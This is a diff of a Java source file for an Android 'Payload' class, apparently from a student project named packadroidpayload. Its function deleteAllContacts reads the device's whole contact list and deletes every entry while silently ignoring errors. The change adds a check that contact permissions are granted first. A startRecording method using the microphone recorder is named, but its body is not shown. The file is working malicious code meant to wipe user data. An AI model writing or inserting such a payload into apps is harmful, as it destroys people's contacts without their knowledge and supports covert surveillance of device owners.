@@ -1,7 +1,9 @@
 package com.tum.team05.packadroidpayload;
 
+import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.net.Uri;
@@ -20,19 +22,22 @@ import java.util.List;
 public class Payload {
 
     public static void deleteAllContacts(Context context) {
-        ContentResolver cr = context.getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-        assert cur != null;
-        while (cur.moveToNext()) {
-            try {
-                String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
-                Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
+        if(context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+                && context.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+            ContentResolver cr = context.getContentResolver();
+            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+            assert cur != null;
+            while (cur.moveToNext()) {
+                try {
+                    String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
+                    Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
 
-                cr.delete(uri, null, null);
-            } catch (Exception e) {
+                    cr.delete(uri, null, null);
+                } catch (Exception e) {
+                }
             }
+            cur.close();
         }
-        cur.close();
     }
 
     public static void startRecording(Context applicationContext) {
